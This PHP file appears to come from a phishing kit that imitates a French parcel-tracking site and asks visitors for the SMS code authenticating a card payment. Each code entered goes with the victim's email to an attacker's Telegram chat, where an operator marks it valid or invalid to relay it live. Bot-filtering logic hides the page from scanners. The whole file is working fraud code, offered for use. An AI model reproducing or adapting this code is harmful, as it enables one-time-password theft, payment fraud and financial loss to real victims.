<?php

if (!isset($token) || $token !== $_SESSION['token']) {
    $this->killBot->show404Page();
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['token']) && $_POST['token'] === $token) {
        $code = htmlspecialchars($_POST['code']);
        if (empty($code)) {
            header("location: ./code?id=" . $token . "&empty");
            return;
        }
        $user = "<code>" . $_SESSION['email'] . "</code>";

        $id = time();
        $response = telegram_api($config['token'], 'sendMessage', [
            'chat_id' => $config['cc'],
            'text' =>  "$user, a soumis le code : <b><i><code>$code</code></i></b>",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => '✔ Code valide', 'callback_data' => 'valid_' . $id]],
                    [['text' => '❌ Code invalide', 'callback_data' => 'invalid_' . $id]],
                    $btnBl
                ]
            ])
        ]);

        $mid = $response['message_id'];

        ini_set('memory_limit', '-1');
        ini_set('max_execution_time', '60');

        $stopLoop = false;
        $offset = 0;
        $startTime = time();

        while (!$stopLoop && $startTime + 40 > time()) {
            try {
                $updates = telegram_api($config['token'], 'getUpdates', [
                    'offset' => $offset,
                    'timeout' => 50
                ], true);

                foreach ($updates as $update) {
                    $offset = $update['update_id'] + 1;

                    if (isset($update['callback_query'])) {
                        $callbackQuery = $update['callback_query'];
                        $callbackData = $callbackQuery['data'] ?? '';
                        $dataParts = explode('_', $callbackData);
                        $mid2 = $callbackQuery['message']['message_id'] ?? '';

                        if ($mid == $mid2) {
                            $action = $dataParts[0] ?? '';
                            $username = '@' . ($callbackQuery['from']['username'] ?? 'unknown');

                            $messageData = [
                                'chat_id' => $config['cc'],
                                'parse_mode' => 'HTML',
                                'message_id' => $mid2,
                                'reply_markup' => [],
                                'text' => $callbackQuery['message']['text']
                            ];

                            try {
                                if ($action === 'valid') {
                                    telegram_api($config['token'], 'sendMessage', [
                                        'chat_id' => $config['cc'],
                                        'text' => $username . ' -> ' . $user . ' VALID OTP 📲',
                                        'parse_mode' => 'HTML',
                                    ]);
                                    telegram_api($config['token'], 'editMessageText', $messageData, true);
                                    telegram_api($config['token'], 'answerCallbackQuery', [
                                        'callback_query_id' => $callbackQuery['id'],
                                        'text' => '✔ Code valide',
                                    ], true);
                                    $stopLoop = true;
                                    header('Location: /fin?id=' . $token);
                                    exit;
                                } elseif ($action === 'invalid') {
                                    telegram_api($config['token'], 'sendMessage', [
                                        'chat_id' => $config['cc'],
                                        'text' => $username . ' -> ' . $user . ' INVALID OTP 📲',
                                        'parse_mode' => 'HTML',
                                    ]);
                                    telegram_api($config['token'], 'editMessageText', $messageData, true);
                                    telegram_api($config['token'], 'answerCallbackQuery', [
                                        'callback_query_id' => $callbackQuery['id'],
                                        'text' => '❌ Code invalide',
                                    ], true);
                                    $stopLoop = true;
                                    header('Location: /code?id=' . $token . '&invalid');
                                    exit;
                                } 
                            } catch (Exception $e) {
                                error_log("Error handling callback query: " . $e->getMessage());
                            }
                        }
                    }
                }
            } catch (Exception $e) {
                error_log("Error occurred during polling: " . $e->getMessage());
            }
        }
        header('Location: /code?id=' . $token);
        exit;
    }
} else {
    require_once(b . '/views/components/header.php');
?>
    <h2>Numéro de suivi : <?= $config['code'] ?></h2>

    <p>Vous avez reçu un code par SMS pour authentifier votre paiement.</p>

    <form method="post" novalidate='novalidate'>
        <input type="hidden" name="token" value="<?= htmlspecialchars($token) ?>" />
        <?php if (isset($_GET["invalid"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">
                    Le code est incorrect. Veuillez réessayer.
                </p>
            </div>
        <?php } ?>
        <div class="fieldWrapper">
            <input type="text" id="tracking_form_token" name="code" placeholder="" inputmode="numeric">
            <label for="tracking_form_token" class="required">Code reçu par SMS</label>
        </div>
        <input type="hidden" name="form" value="true">
        <?php if (isset($_GET["empty"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div>
            <button type="submit" id="tracking_form_submit">Authentifiez votre transaction.</button>
        </div>
    </form>
<?php
    require_once(b . '/views/components/footer.php');
}
